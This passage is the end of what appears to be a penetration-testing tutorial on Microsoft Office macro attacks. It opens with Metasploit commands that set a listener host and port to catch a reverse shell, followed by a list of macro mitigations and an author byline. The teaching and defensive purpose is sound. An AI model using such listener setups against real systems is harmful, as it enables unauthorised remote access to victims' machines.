set lhost 192.168.152.131
set lport 1234
run
sysinfo</pre>
<p class="ai-optimize-111"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8bVCRFJTeUw/XlaWUBEdTQI/AAAAAAAAi2I/79dQLltTXb8-Kd1rd2RZYI4ULfNpXSa2ACLcBGAsYHQ/s1600/38.png"/></span></p>
<p class="ai-optimize-112"><span style="color: #000000;">Ok! Enough exploitation. We get it is a very serious threat to any organization. Let’s talk about how we can mitigate it?</span></p>
<h3 class="ai-optimize-113"><span style="color: #800000;">Mitigations </span></h3>
<ul>
<li class="ai-optimize-114"><span style="color: #000000;">Microsoft Office Macros should be disabled in the organization.</span></li>
<li class="ai-optimize-115"><span style="color: #000000;">Enable the Feature to block the macros in the documents that originate from the internet. [Office 2016, Office 365]</span></li>
<li class="ai-optimize-116"><span style="color: #000000;">If the usage of macros is unavoidable, only enable the users or groups that absolutely need to use the capabilities of the macro.</span></li>
<li class="ai-optimize-117"><span style="color: #000000;">Allowing only signed macros can also reduce the number of attacks that could be successful.</span></li>
<li class="ai-optimize-118"><span style="color: #000000;">Use the Trusted Locations feature of the Microsoft Office Trust Centre. This means only the settings configured at the Trusted Location will be in action regardless of the local configurations.</span></li>
</ul>
<p class="ai-optimize-119"><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
